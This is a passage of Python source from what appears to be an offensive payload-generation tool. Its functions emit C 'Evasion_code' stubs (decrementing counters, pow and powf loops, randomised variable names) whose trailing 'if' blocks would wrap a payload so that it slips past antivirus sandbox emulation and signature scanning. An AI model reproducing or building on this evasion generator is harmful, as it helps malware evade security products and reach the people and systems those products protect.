        Evasion_code += "while ( " + Randcpt + " > 0 ){\n"
        Evasion_code += Randcpt + " = " + Randcpt + " - 1;}\n"
        Evasion_code += "if("+ Randcpt + " == 0){\n"

    elif number == 5: # powf counter 

        Randsmall = str(random.uniform(1.100,2.000))
        Randsmall2 = str(random.uniform(1.100,2.000))
        Randbig = str(random.randrange(10000,100000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "float " + Randcpt + "  = " + Randsmall + ";\n"
        Evasion_code += "float " + Randi + " = " + Randsmall2 + ";\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + " = powf(" + Randcpt + "," + Randi + ");}\n"
        Evasion_code += "if("+ Randcpt + " >= " + Randbig + "){\n"

    elif number == 6: # pow counter 

        Randsmall = str(random.uniform(1.100,3.000))
        Randsmall2 = str(random.uniform(1.100,3.000))
        Randbig = str(random.randrange(10000,99000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "double " + Randcpt + "  = " + Randsmall + ";\n"
        Evasion_code += "double " + Randi + " = " + Randsmall2 + ";\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + " = pow(" + Randcpt + "," + Randi + ");}\n"
        Evasion_code += "if("+ Randcpt + " >= " + Randbig + "){\n"

    elif number == 7: # am i numb?

        Randbig = str(random.randrange(100000000,200000000,10))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randi + " = " + str(random.randrange(10,99,2)) + ";\n"
        Evasion_code += "int " + Randcpt + "  = " + Randbig + ";\n"
        Evasion_code += "while ( " + Randcpt + " > " + Randi + " ){\n"
        Evasion_code += Randcpt + " = " + Randcpt + " - 1;}\n"
        Evasion_code += "if("+ Randcpt + " == " + Randi + "){\n"

    return Evasion_code

def Enter2Continue():
    try:   
        ans=input("\n[>] Press Enter to continue") 
    except SyntaxError:
        pass

    pass    
          
def varname_creator():
    varname = ""
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))
    return varname 



